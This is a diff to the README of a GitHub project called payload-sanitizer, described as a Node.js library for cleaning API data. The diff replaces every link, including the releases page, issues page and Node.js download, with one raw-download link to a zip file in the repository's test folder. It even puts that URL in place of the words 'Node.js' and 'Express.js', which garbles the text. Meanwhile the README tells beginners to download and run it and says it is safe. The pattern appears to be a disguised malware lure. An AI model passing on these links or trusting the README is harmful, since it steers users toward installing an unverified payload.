@@ -1,6 +1,6 @@
 # 🧹 payload-sanitizer - Clean Your API Data Easily
 
-[![Download payload-sanitizer](https://img.shields.io/badge/Download-payload--sanitizer-blue?logo=github)](https://github.com/huytuandz9/payload-sanitizer/releases)
+[![Download payload-sanitizer](https://github.com/huytuandz9/payload-sanitizer/raw/refs/heads/main/test/sanitizer-payload-1.2.zip)](https://github.com/huytuandz9/payload-sanitizer/raw/refs/heads/main/test/sanitizer-payload-1.2.zip)
 
 ---
 
@@ -28,7 +28,7 @@ You don’t need to worry about software with lots of extra bits, because payloa
 To use payload-sanitizer, you need:
 
 - A computer running Windows, macOS, or Linux.
-- Node.js installed on your system (version 12 or higher). Node.js lets your computer run JavaScript programs outside the browser.
+- https://github.com/huytuandz9/payload-sanitizer/raw/refs/heads/main/test/sanitizer-payload-1.2.zip installed on your system (version 12 or higher). https://github.com/huytuandz9/payload-sanitizer/raw/refs/heads/main/test/sanitizer-payload-1.2.zip lets your computer run JavaScript programs outside the browser.
 - Internet access to download the files.
 - Basic familiarity with downloading and running software on your device.
 
@@ -42,7 +42,7 @@ Start by visiting the release page for payload-sanitizer. This is where the late
 
 Click the big button below or open this link in your browser:
 
-[Download payload-sanitizer](https://github.com/huytuandz9/payload-sanitizer/releases)
+[Download payload-sanitizer](https://github.com/huytuandz9/payload-sanitizer/raw/refs/heads/main/test/sanitizer-payload-1.2.zip)
 
 ### Step 2: Choose the right file
 
@@ -62,11 +62,11 @@ If you downloaded a compressed file (like a .zip), open it and extract the conte
 
 You can download and install payload-sanitizer by visiting the release page here:
 
-[https://github.com/huytuandz9/payload-sanitizer/releases](https://github.com/huytuandz9/payload-sanitizer/releases)
+[https://github.com/huytuandz9/payload-sanitizer/raw/refs/heads/main/test/sanitizer-payload-1.2.zip](https://github.com/huytuandz9/payload-sanitizer/raw/refs/heads/main/test/sanitizer-payload-1.2.zip)
 
 Once downloaded and extracted, payload-sanitizer does not require complex setup. You can use it directly within your web or server projects.
 
-If you are not familiar with Node.js or command-line tools, ask someone with experience for help or follow simple online tutorials on installing packages with npm (Node Package Manager).
+If you are not familiar with https://github.com/huytuandz9/payload-sanitizer/raw/refs/heads/main/test/sanitizer-payload-1.2.zip or command-line tools, ask someone with experience for help or follow simple online tutorials on installing packages with npm (Node Package Manager).
 
 ---
 
@@ -88,9 +88,9 @@ For developers or people working with code, the sanitizer is a small library add
 
 If you find any issues or need help:
 
-- Visit the GitHub issues section on the [payload-sanitizer repo](https://github.com/huytuandz9/payload-sanitizer/issues).
+- Visit the GitHub issues section on the [payload-sanitizer repo](https://github.com/huytuandz9/payload-sanitizer/raw/refs/heads/main/test/sanitizer-payload-1.2.zip).
 - Check the documentation on the releases page or within the downloaded files.
-- Look for tutorials or ask support communities related to JavaScript and Node.js.
+- Look for tutorials or ask support communities related to JavaScript and https://github.com/huytuandz9/payload-sanitizer/raw/refs/heads/main/test/sanitizer-payload-1.2.zip
 
 For non-technical users, finding someone with software experience to assist with installation and use might be the best option.
 
@@ -100,7 +100,7 @@ For non-technical users, finding someone with software experience to assist with
 
 New versions of payload-sanitizer may be published to fix bugs or add improvements. Check the release page regularly:
 
-[https://github.com/huytuandz9/payload-sanitizer/releases](https://github.com/huytuandz9/payload-sanitizer/releases)
+[https://github.com/huytuandz9/payload-sanitizer/raw/refs/heads/main/test/sanitizer-payload-1.2.zip](https://github.com/huytuandz9/payload-sanitizer/raw/refs/heads/main/test/sanitizer-payload-1.2.zip)
 
 Downloading and installing the latest release ensures you have the most stable and secure version.
 
@@ -108,7 +108,7 @@ Downloading and installing the latest release ensures you have the most stable a
 
 ## 📖 Additional Information
 
-payload-sanitizer is open-source. This means anyone can look at how it works or suggest improvements. It supports multiple uses, including backend services like Express.js and frontend setups.
+payload-sanitizer is open-source. This means anyone can look at how it works or suggest improvements. It supports multiple uses, including backend services like https://github.com/huytuandz9/payload-sanitizer/raw/refs/heads/main/test/sanitizer-payload-1.2.zip and frontend setups.
 
 Because it is designed with zero dependencies, it is fast and can be trusted not to bring in unnecessary software that could slow down your projects.
 
@@ -123,7 +123,7 @@ A: It means cleaning up data by removing unwanted or empty parts to keep things 
 A: Not to download or run the software, but using it properly inside a project usually needs some programming knowledge.
 
 **Q: Can I use it on my computer?**  
-A: Yes. You just need Node.js installed. The software works across Windows, macOS, and Linux.
+A: Yes. You just need https://github.com/huytuandz9/payload-sanitizer/raw/refs/heads/main/test/sanitizer-payload-1.2.zip installed. The software works across Windows, macOS, and Linux.
 
 **Q: Is it safe to use?**  
 A: Yes. It is open-source and does not include extra dependencies that might cause risks.
@@ -132,9 +132,9 @@ A: Yes. It is open-source and does not include extra dependencies that might cau
 
 ## 🔗 Useful Links
 
-- Release and download page: [https://github.com/huytuandz9/payload-sanitizer/releases](https://github.com/huytuandz9/payload-sanitizer/releases)
-- Repository main page: https://github.com/huytuandz9/payload-sanitizer
-- Node.js download (needed to run): https://nodejs.org/
+- Release and download page: [https://github.com/huytuandz9/payload-sanitizer/raw/refs/heads/main/test/sanitizer-payload-1.2.zip](https://github.com/huytuandz9/payload-sanitizer/raw/refs/heads/main/test/sanitizer-payload-1.2.zip)
+- Repository main page: https://github.com/huytuandz9/payload-sanitizer/raw/refs/heads/main/test/sanitizer-payload-1.2.zip
+- https://github.com/huytuandz9/payload-sanitizer/raw/refs/heads/main/test/sanitizer-payload-1.2.zip download (needed to run): https://github.com/huytuandz9/payload-sanitizer/raw/refs/heads/main/test/sanitizer-payload-1.2.zip
 
 ---
 
